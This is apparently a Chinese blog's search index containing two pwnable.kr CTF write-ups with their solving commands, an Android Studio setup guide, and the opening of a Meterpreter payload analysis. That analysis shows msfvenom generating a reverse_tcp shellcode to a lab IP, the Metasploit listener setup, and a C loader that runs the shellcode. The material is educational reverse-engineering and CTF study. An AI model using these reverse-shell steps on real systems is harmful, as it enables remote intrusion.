<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwnable.kr系列writeup之collision</title>
    <url>/pwnable_kr_writeup_collision.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇内容是pwnable.kr系列writeup的第二篇collision，此题目的目的是为了让我们学习和了解MD5 hash碰撞相关的知识内容</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>还是老样子题目需要我们连接ssh，这次给我的提示是关于MD5 hash碰撞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna do something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
<p>还是首先<code>ls</code>查看有什么惊喜，然后用<code>cat</code>查看题目源码</p>
<a id="more"></a>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">col@ubuntu:~$ ls -al</span><br><span class="line">total <span class="number">36</span></span><br><span class="line">drwxr-x---  <span class="number">5</span> root    col     <span class="number">4096</span> Oct <span class="number">23</span>  <span class="number">2016</span> .</span><br><span class="line">drwxr-xr-x <span class="number">93</span> root    root    <span class="number">4096</span> Oct <span class="number">10</span>  <span class="number">2018</span> ..</span><br><span class="line">d---------  <span class="number">2</span> root    root    <span class="number">4096</span> Jun <span class="number">12</span>  <span class="number">2014</span> .bash_history</span><br><span class="line">dr-xr-xr-x  <span class="number">2</span> root    root    <span class="number">4096</span> Aug <span class="number">20</span>  <span class="number">2014</span> .irssi</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root    root    <span class="number">4096</span> Oct <span class="number">23</span>  <span class="number">2016</span> .pwntools-cache</span><br><span class="line">-r-sr-x---  <span class="number">1</span> col_pwn col     <span class="number">7341</span> Jun <span class="number">11</span>  <span class="number">2014</span> col</span><br><span class="line">-rw-r--r--  <span class="number">1</span> root    root     <span class="number">555</span> Jun <span class="number">12</span>  <span class="number">2014</span> col.c</span><br><span class="line">-r--r-----  <span class="number">1</span> col_pwn col_pwn   <span class="number">52</span> Jun <span class="number">11</span>  <span class="number">2014</span> flag</span><br><span class="line">col@ubuntu:~$ cat col.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">		res += ip[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面来分析一下题目</p>
<ul>
<li>先看<code>main</code>函数，首先判断了<code>argc&lt;2</code>说明我们需要输入一个命令行参数</li>
<li>使用<code>strlen</code>函数判断了我们输入的命令行参数的长度必须要等于20字节</li>
<li>之后将我们输入的命令行参数<code>arg[1]</code>传入了<code>check_password</code>函数，如果函数返回值等于定义的全局变量<code>hashcode</code>则显示flag</li>
<li>我们分析下<code>check_password</code>函数，此函数的唯一参数是我们输入的有20个字节长度的命令行参数，首先该函数将<code>const char *p</code>类型也就是我们输入的命令行参数强转为了<code>int*</code>类型并赋值给变量<code>ip</code>，此时<code>for</code>循环中的<code>p[i]</code>就可以访问一个int类型的4字节内容，所以循环5次就可以求出20个字节内容的<code>Hash</code></li>
</ul>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>经过上面的题目分析，我们可以看到<code>check_password</code>是一个求Hash的小算法，我们需要让我们输入的20字节内容经过这个小算法进行Hash然后等于全局变量<code>0x21DD09EC</code>，这个小算法只是简单的<code>res += ip[i]</code>，所以最简单的解决办法是我们可以控制我们输入的前16个字节内容让他们都相同并且它们相加后的和小于<code>0x21DD09EC</code>，然后最后用<code>0x21DD09EC</code>减去我们构造的16字节的和就等于最后4字节的内容，接下来我们开始构造</p>
<img src="/pwnable_kr_writeup_collision/1.jpg" title="图1">
<p>计算最后4字节</p>
<img src="/pwnable_kr_writeup_collision/2.jpg" title="图2">
<p>所以最后的exp如下，我们实际可以构造的前16字节包括<code>0x8</code>和他之前的<code>0x1~0x7</code>，如果用<code>0x9</code>构造就大于了预定的Hash值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">col@ubuntu:~$ ./col `python -c <span class="string">"print '\x08\x08\x08\x08' * 4 + '\xcc\xe9\xbc\x01'"</span>`</span><br><span class="line">daddy! I just managed to create a <span class="built_in">hash</span> collision :)</span><br></pre></td></tr></table></figure>
<hr>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
        <tag>collision</tag>
        <tag>MD5 hash collision</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列writeup之fd</title>
    <url>/pwnable_kr_writeup_fd.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接下来将会记录一下pwnable.kr系列的writeup，本篇是第一题fd，当然重点不是<code>writeup</code>而是要学习解题中遇到的新知识和思路，本题目的目的是为了让我们学习<code>Linux file IO</code>相关的知识</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>我们可以看到题目给了我们一个小提示<code>Linux中的文件描述符是什么?</code>，可见这题考察的应该是关于Linux文件描述符相关的知识，还为初学者准备一个解题的油管视频，当然题目需要我们<code>ssh</code>到题目中所给的<code>pwnable.kr</code>服务器</p>
<img src="/pwnable_kr_writeup_fd/1.jpg" title="图1">
<a id="more"></a>
<p>我这里的环境是Ubuntu18.04.2，直接在终端使用ssh连接上了服务器，我们直接<code>ls</code>一下就可以看到题目，<code>fd</code>为已经编译好的可执行文件，<code>fd.c</code>是题目的源码，<code>flag</code>文件中的内容就是我们要获取的，但是我们目前登录的这个用户组是没有权限的，只能通过解题来完成</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">likte@ubuntu:~$ ssh fd@pwnable.kr -p2222</span><br><span class="line">fd@pwnable.kr<span class="string">'s password: </span></span><br><span class="line"><span class="string"> ____  __    __  ____    ____  ____   _        ___      __  _  ____  </span></span><br><span class="line"><span class="string">|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ </span></span><br><span class="line"><span class="string">|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  '</span> / |  D  )</span><br><span class="line">|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / </span><br><span class="line">|  |  |  `  <span class="string">'  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ </span></span><br><span class="line"><span class="string">|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \</span></span><br><span class="line"><span class="string">|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|</span></span><br><span class="line"><span class="string">                                                                     </span></span><br><span class="line"><span class="string">- Site admin : daehee87.kr@gmail.com</span></span><br><span class="line"><span class="string">- IRC : irc.netgarage.org:6667 / #pwnable.kr</span></span><br><span class="line"><span class="string">- Simply type "irssi" command to join IRC now</span></span><br><span class="line"><span class="string">- files under /tmp can be erased anytime. make your directory under /tmp</span></span><br><span class="line"><span class="string">- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal</span></span><br><span class="line"><span class="string">fd@ubuntu:~$ ls -al</span></span><br><span class="line"><span class="string">total 40</span></span><br><span class="line"><span class="string">drwxr-x---  5 root   fd   4096 Oct 26  2016 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 93 root   root 4096 Oct 10  2018 ..</span></span><br><span class="line"><span class="string">d---------  2 root   root 4096 Jun 12  2014 .bash_history</span></span><br><span class="line"><span class="string">-rw-------  1 root   root  128 Oct 26  2016 .gdb_history</span></span><br><span class="line"><span class="string">dr-xr-xr-x  2 root   root 4096 Dec 19  2016 .irssi</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root   root 4096 Oct 23  2016 .pwntools-cache</span></span><br><span class="line"><span class="string">-r-sr-x---  1 fd_pwn fd   7322 Jun 11  2014 fd</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root   root  418 Jun 11  2014 fd.c</span></span><br><span class="line"><span class="string">-r--r-----  1 fd_pwn root   50 Jun 11  2014 flag</span></span><br><span class="line"><span class="string">fd@ubuntu:~$</span></span><br></pre></td></tr></table></figure>
<p>我们使用<code>cat</code>命令查看一下题目的源码，接下来我们来分析一下题目</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fd@ubuntu:~$ cat fd.c </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">	len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>我们看到main函数开始首先判断了<code>argc &lt; 2</code>就返回失败，说明我们要运行程序是要添加命令行参数，一般<code>argv[0]</code>都是程序的文件名，而<code>argv[1]</code>为我们输入第一个的命令参数，所以我们只要输入一个命令行参数就满足了这条件</li>
<li>接下来将我们输入的命令行参数用<code>atoi</code>函数转为了整数之后并减去了<code>0x1234</code>，所以我们输入命令行参数<code>arg[1]</code>是我们可控的</li>
<li><code>read</code>函数的定义是会尝试从文件描述符<code>fd</code>读取到从<code>buf</code>开始的缓冲区的字节数，这里我们就要了解下Linux的文件描述符了，由表可见我们需要把文件描述符构造成0，这样<code>read</code>函数就会从<code>stdin</code>中读入内容，这样我们就可以控制<code>buf</code>中的内容了</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">文件描述符</th>
<th style="text-align:center">用途</th>
<th style="text-align:center">stdio流</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">标准输入</td>
<td style="text-align:center">stdin</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">标准输出</td>
<td style="text-align:center">stdout</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">标准错误</td>
<td style="text-align:center">stderr</td>
</tr>
</tbody>
</table>
<ul>
<li>最后使用<code>strcmp</code>函数对比了<code>buf</code>中的内存内容如果等于<code>LETMEWIN\n</code>则显示成功，然后显示flag</li>
<li>如果对比失败则显示让我们学习<code>Linux file IO</code>的知识</li>
</ul>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>由以上的分析可知我们输入的命令行参数减去<code>0x1234</code>为<code>0</code>这样<code>read</code>函数才会从标准输入中读取内容我们才可以控制<code>buf</code>中的内容，但是注意一点我们输入的命令行参数不会以十六进制读取，所以我们要输入的为<code>0x1234</code>的十进制形式<code>4660</code></p>
<img src="/pwnable_kr_writeup_fd/2.jpg" title="图2">
<p>所以最后的<code>exp</code>为如下，<code>mommy! I think I know what a file descriptor is!!</code>这个就是<code>flag</code>了，我们把这个<code>flag</code>提交到<code>pwnable.kr</code>就可以了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fd@ubuntu:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br><span class="line">fd@ubuntu:~$</span><br></pre></td></tr></table></figure>
<hr>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
        <tag>fd</tag>
        <tag>Linux file IO</tag>
      </tags>
  </entry>
  <entry>
    <title>AndroidStudio开发环境搭建</title>
    <url>/AndroidStudio_Development_Env_Setup.html</url>
    <content><![CDATA[<h2 id="JDK环境配置"><a href="#JDK环境配置" class="headerlink" title="JDK环境配置"></a>JDK环境配置</h2><p>如图1首先进入oracle官网下载jdk11安装包</p>
<img src="/AndroidStudio_Development_Env_Setup/1.jpg" title="图1">
<a id="more"></a>
<p>注意Oracle JDK许可证已经更新，所以点击下载会跳到图所示的账号登陆页面，只有登录账号后才可下载，如果有Oracle账号的就可以直接登录下载，如果没有就要注册一个Oracle账号了，如果嫌麻烦可以Google一个Oracle账号进行下载</p>
<img src="/AndroidStudio_Development_Env_Setup/2.jpg" title="图2">
<p>JDK安装步骤直接默认路径安装下一步即可</p>
<img src="/AndroidStudio_Development_Env_Setup/3.jpg" title="图3">
<p>然后配置JDK环境变量，首先在系统变量新建一个变量名为<code>JAVA_HOME</code>，变量值为你自己实际安装JDK的路径</p>
<img src="/AndroidStudio_Development_Env_Setup/4.jpg" title="图4">
<p>接着编辑path变量添加<code>%JAVA_HOME%\bin;</code>变量</p>
<img src="/AndroidStudio_Development_Env_Setup/5.jpg" title="图5">
<p>打开cmd命令行窗口输入如下两条命令如果显示如下则JDK环境变量配置成功</p>
<img src="/AndroidStudio_Development_Env_Setup/6.jpg" title="图6">
<h2 id="AndroidStudio安装配置"><a href="#AndroidStudio安装配置" class="headerlink" title="AndroidStudio安装配置"></a>AndroidStudio安装配置</h2><p>进入官方下载网站，根据你自己的系统平台选择对应AndroidStudio下载</p>
<img src="/AndroidStudio_Development_Env_Setup/7.jpg" title="图7">
<p>我下载的是AndroidStudio安装程序，打开安装程序可能会很久没有窗口响应，这应该是正常现象只要耐心等待一会就会跳出安装程序窗口，<strong>注意安装环境下需要全程联网否则可能会出现一堆问题，最好是科学上网环境否则有些下载会失败</strong></p>
<img src="/AndroidStudio_Development_Env_Setup/8.jpg" title="图8">
<p>选择你认为合适的安装路径，然后下一步进行安装</p>
<img src="/AndroidStudio_Development_Env_Setup/9.jpg" title="图9">
<p>安装完毕之后打开AndroidStudio，会提示导入工作目录（工作目录中保存着AndroidStudio的配置文件等），如果之前使用过AndroidStudi可以选择导入工作目录，首次安装直接选择不导入即可</p>
<img src="/AndroidStudio_Development_Env_Setup/10.jpg" title="图10">
<p>之后会提示是否允许Google收集并发送匿名工具使用数据等，我选择不发送</p>
<img src="/AndroidStudio_Development_Env_Setup/11.jpg" title="图11">
<p>接着会提示我们是否要设置代理，现在一般情况下不需要代理也可以访问，有些情况下可能需要代理才能访问所以最好是弄一下科学上网环境，我这里选择不设置</p>
<img src="/AndroidStudio_Development_Env_Setup/12.jpg" title="图12">
<p>配置完成之后会显示如图13窗口选择下一步即可</p>
<img src="/AndroidStudio_Development_Env_Setup/13.jpg" title="图13">
<p>为AndroidStudio选择你想要的设置类型，这里我们选择第一项标准设置即可，第二项为自定义配置</p>
<img src="/AndroidStudio_Development_Env_Setup/14.jpg" title="图14">
<p>选择AndroidStudio主题，根据个人喜好选择即可</p>
<img src="/AndroidStudio_Development_Env_Setup/15.jpg" title="图15">
<p>接下来AndroidStudio提示下载SDK，我这里选择Cancel，因为AndroidStudio默认会将SDK下载到C盘而且现在不能更改下载路径，选中Cancel之后提示我们在跳过设置向导，询问我们下次打开AndroidStudio是否还要重新运行向导，我们这里选择第二项不运行向导</p>
<img src="/AndroidStudio_Development_Env_Setup/16.jpg" title="图16">
<p>设置完成之后来到了AndroisStudio主界面，由于我们刚刚跳过了SDK的下载所以我们要配置下载SDK</p>
<img src="/AndroidStudio_Development_Env_Setup/17.jpg" title="图17">
<p>我们选择Configure然后选择SDK Manger</p>
<img src="/AndroidStudio_Development_Env_Setup/18.jpg" title="图18">
<p>可能会出现点击SDK Manger无响应的情况，如果出现这个情况我们只要选择设置Settings选项然后在System Settings选项下选择Androis SDK也是相同的，接着我们点击Edit配置SDK路径</p>
<img src="/AndroidStudio_Development_Env_Setup/19.jpg" title="图19">
<p>注意选择SDK路径的盘符容量要大一些，因为SDK使用后续会越来越大</p>
<img src="/AndroidStudio_Development_Env_Setup/20.jpg" title="图20">
<p>下一步即可</p>
<img src="/AndroidStudio_Development_Env_Setup/21.jpg" title="图21">
<p>接下来要做的就是等待SDK下载完成，当然你的网速越快SDK安装也越快</p>
<img src="/AndroidStudio_Development_Env_Setup/22.jpg" title="图22">
<p>显示如下界面则SDK安装完成</p>
<img src="/AndroidStudio_Development_Env_Setup/23.jpg" title="图23">
<p>接下来我们新建一个测试工程</p>
<img src="/AndroidStudio_Development_Env_Setup/24.jpg" title="图24">
<p>选择新建一个Empty Activity</p>
<img src="/AndroidStudio_Development_Env_Setup/25.jpg" title="图25">
<p>配置工程，设置工程名、公司域名、项目保存路径等等</p>
<img src="/AndroidStudio_Development_Env_Setup/26.jpg" title="图26">
<p>此时会联网下载Gradle构建工具，这一步最好全局科学上网否则下载可能会失败</p>
<img src="/AndroidStudio_Development_Env_Setup/27.jpg" title="图27">
<p>如果没有出错我们点击小锤子进行编译</p>
<img src="/AndroidStudio_Development_Env_Setup/28.jpg" title="图28">
<p>编译成功APK文件默认生成在你的项目工程下的<code>app\build\outputs\apk\debug\app-debug.apk</code></p>
<img src="/AndroidStudio_Development_Env_Setup/29.jpg" title="图29">
<p>测试APP的话可以使用Android Studio中的AVD Manger创建虚拟机，或者下载其他Android模拟器，我这里adb安装到使用实体机测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS D:\AndroidStudioProjects\MyApplication\app\build\outputs\apk\debug&gt; adb install .\app-debug.apk</span><br><span class="line">Performing Push Install</span><br><span class="line">.\app-debug.apk: 1 file pushed. 3.6 MB/s (1651404 bytes in 0.439s)</span><br><span class="line">        pkg: /data/local/tmp/app-debug.apk</span><br><span class="line">Success</span><br></pre></td></tr></table></figure>
<p>如果生成生成了APP并且成功运行，则整个Android Studio开发环境搭建完成</p>
<img src="/AndroidStudio_Development_Env_Setup/30.jpg" title="图30">
<hr>]]></content>
      <categories>
        <category>安卓开发</category>
      </categories>
      <tags>
        <tag>AndroidStudio</tag>
      </tags>
  </entry>
  <entry>
    <title>深入解析Meterpreter有效载荷</title>
    <url>/Internals_meterpreter_payload.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Meterpreter是metasploit中的一种高级，动态可扩展的有效载荷，它使用内存中的DLL注入stagers，并在运行时通过网络进行扩展，关于更多Meterpreter介绍可以参考此官方<a href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/" target="_blank" rel="noopener">连接</a>，在本文中我们将结合逆向分析和阅读源码深入解析Meterpreter有效载荷技术细节。</p>
<h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">win7x64</span><br><span class="line">kali 2019.1a</span><br><span class="line">msf5</span><br><span class="line">x64Dbg</span><br><span class="line">LordPE</span><br><span class="line">WireShark</span><br></pre></td></tr></table></figure>
<h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><p>因为我们主要是为了分析Meterpreter payload，所以我们就使用msfvenom生成一个c语言形式的reverse_tcp的shellcode方便我们进行流量分析和逆向分析，实际使用中我们一般会对payload进行加密和免杀混淆等，接着打开Metasploit监听端口</p>
<a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 生成reverse_tcp payload</span><br><span class="line">root@likte:~<span class="comment"># msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.44.138 lport=6666 -f c</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">payload size: 341 bytes</span><br><span class="line">Final size of c file: 1457 bytes</span><br><span class="line">unsigned char buf[] =</span><br><span class="line"><span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</span>......;	// shellcode省略</span><br><span class="line"></span><br><span class="line">// 监听端口</span><br><span class="line">root@likte:~<span class="comment"># msfconsole</span></span><br><span class="line">msf5 &gt; use multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.44.138</span><br><span class="line">LHOST =&gt; 192.168.44.138</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 6666</span><br><span class="line">LPORT =&gt; 6666</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.44.138:6666 </span><br><span class="line">msf5 exploit(multi/handler) &gt;</span><br></pre></td></tr></table></figure>
<p>此shellcode需要我们编写一个c程序使用内联汇编进行调用，由于程序执行流导向了栈上的shellcode上执行所以在编译时需要关闭DEP，为了方便调试也应该关闭随机基址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] =</span><br><span class="line"><span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</span>......;	<span class="comment">// shellcode省略</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		lea eax, buf;</span><br><span class="line">		push eax;</span><br><span class="line">		ret;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="分析payload"><a href="#分析payload" class="headerlink" title="分析payload"></a>分析payload</h2><p>图1为shellcode逻辑开始处</p>
<img src="/Internals_meterpreter_payload/1.jpg" title="图1">
<p>我们可以查看一下<code>reverse_tcp</code>的部分实现源码，可以看到源码第一个调用的函数为<code>asm_reverse_tcp</code>函数</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/reverse_tcp.rb</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">  <span class="comment"># Generate and compile the stager</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">generate_reverse_tcp</span><span class="params">(opts=&#123;&#125;)</span></span></span><br><span class="line">    combined_asm = %Q^</span><br><span class="line">      cld                    	; 清空方向标志位</span><br><span class="line">      call start             	; call start位置</span><br><span class="line">      <span class="comment">#&#123;asm_block_api&#125;		; 调用了asm_block_api函数</span></span><br><span class="line">      <span class="symbol">start:</span>			; 注意此时栈顶地址为asm_block_api函数地址</span><br><span class="line">        pop ebp			; 将asm_block_api函数地址弹出到ebp</span><br><span class="line">      <span class="comment">#&#123;asm_reverse_tcp(opts)&#125; 	; 首先调用了asm_reverse_tcp函数</span></span><br><span class="line">      <span class="comment">#&#123;asm_block_recv(opts)&#125; 	; 调用了asm_block_recv函数</span></span><br><span class="line">    ^</span><br><span class="line">    Metasm::shellcode.assemble(Metasm::X86.new, combined_asm).encode_string</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>我们查看<code>asm_reverse_tcp</code>函数部分源码    </p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/reverse_tcp.rb</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asm_reverse_tcp</span><span class="params">(opts=&#123;&#125;)</span></span></span><br><span class="line"></span><br><span class="line">    retry_count  = [opts[<span class="symbol">:retry_count</span>].to_i, <span class="number">1</span>].max</span><br><span class="line">    encoded_port = <span class="string">"0x%.8x"</span> % [opts[<span class="symbol">:port</span>].to_i,<span class="number">2</span>].pack(<span class="string">"vn"</span>).unpack(<span class="string">"N"</span>).first</span><br><span class="line">    encoded_host = <span class="string">"0x%.8x"</span> % Rex::Socket.addr_aton(opts[<span class="symbol">:host</span>]<span class="params">||</span><span class="string">"127.127.127.127"</span>).unpack(<span class="string">"V"</span>).first</span><br><span class="line"></span><br><span class="line">    addr_fam      = <span class="number">2</span></span><br><span class="line">    sockaddr_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    asm = %Q^</span><br><span class="line">      ; <span class="symbol">Input:</span> EBP must be the address of <span class="string">'api_call'</span>.</span><br><span class="line">      ; <span class="symbol">Output:</span> EDI will be the socket <span class="keyword">for</span> the connection to the server</span><br><span class="line">      ; <span class="symbol">Clobbers:</span> EAX, ESI, EDI, ESP will also be modified (-<span class="number">0x1A0</span>)</span><br><span class="line"></span><br><span class="line">      <span class="symbol">reverse_tcp:</span></span><br><span class="line">        push <span class="string">'32'</span>               ; Push the bytes <span class="string">'ws2_32'</span>,<span class="number">0</span>,<span class="number">0</span> onto the stack.</span><br><span class="line">        push <span class="string">'ws2_'</span>             ; ...</span><br><span class="line">        push esp                ; Push a pointer to the <span class="string">"ws2_32"</span> string on the stack.</span><br><span class="line">        push <span class="comment">#&#123;Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')&#125;</span></span><br><span class="line">        mov eax, ebp		;此时ebp为asm_block_api函数的地址</span><br><span class="line">        call eax                ; LoadLibraryA( <span class="string">"ws2_32"</span> )</span><br><span class="line">        			; call eax 相当于call asm_block_api函数</span><br></pre></td></tr></table></figure>
<p>对比我们逆向的结果图2，结果和我们分析的一致</p>
<img src="/Internals_meterpreter_payload/2.jpg" title="图2">
<p>下面图3为<code>asm_block_api</code>函数，该函数接收的参数为要获取函数地址的调用参数和当前模块名称和函数名称Hash的和，该函数主要逻辑就是获取<code>fs:30</code>偏移处的PEB然后获取指向<code>PEB_LDR_DATA</code>结构的指针，然后通过<code>InMemoryOrderModuleList</code>双向链表遍历获取模块名称并对其进行Hash，之后再获取当前模块基址并计算出当前模块的导出表RVA</p>
<img src="/Internals_meterpreter_payload/3.jpg" title="图3">
<p>如果不存在导出表则跳转到图4位置继续遍历双向链表获取下一个模块</p>
<img src="/Internals_meterpreter_payload/4.jpg" title="图4">
